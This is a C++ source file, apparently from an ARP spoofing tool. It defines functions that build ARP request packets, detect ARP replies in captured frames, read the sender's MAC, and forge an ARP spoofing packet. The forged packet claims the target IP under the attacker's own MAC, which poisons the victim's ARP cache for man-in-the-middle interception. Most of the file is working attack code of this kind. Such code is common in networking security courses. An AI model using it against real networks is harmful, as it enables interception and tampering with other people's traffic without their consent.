#include "arp.h"

EthArpPacket makeArpPacket(Mac sMac, Ip sIp, Ip dIp){
    EthArpPacket packet;
    packet.eth_.smac_ = sMac;
    packet.eth_.dmac_ = Mac::broadcastMac();
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = sMac;
    packet.arp_.sip_ = htonl(sIp);
    packet.arp_.tmac_ = Mac::nullMac();
    packet.arp_.tip_ = htonl(dIp);

    return packet;
}

bool checkArpReply(u_char* param, const struct pcap_pkthdr* header, const u_char* pkt_data){
    struct EthHdr *eh = (struct EthHdr*)pkt_data;
    if (eh->type() == 0x0806){
        struct ArpHdr *ah = (struct ArpHdr*)(eh+1);
        if (ah->op() == 0x0002) {
            return true;
        }
    }
    return false;
}

Mac getSenderMac(const u_char* pkt_data){
    struct EthHdr *eh = (struct EthHdr*)pkt_data;
    struct ArpHdr *ah = (struct ArpHdr*)(eh+1);
    return ah->smac();
}

EthArpPacket makeArpSpoofingPacket(Mac senderMac, Mac myMac, Ip targetIp, Ip senderIp){
    EthArpPacket packet;
    Mac& dMac = Mac::broadcastMac();
    packet.eth_.smac_ = myMac;
    packet.eth_.dmac_ = senderMac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = myMac;
    packet.arp_.sip_ = htonl(targetIp);
    packet.arp_.tmac_ = senderMac;
    packet.arp_.tip_ = htonl(senderIp);

    return packet;
}
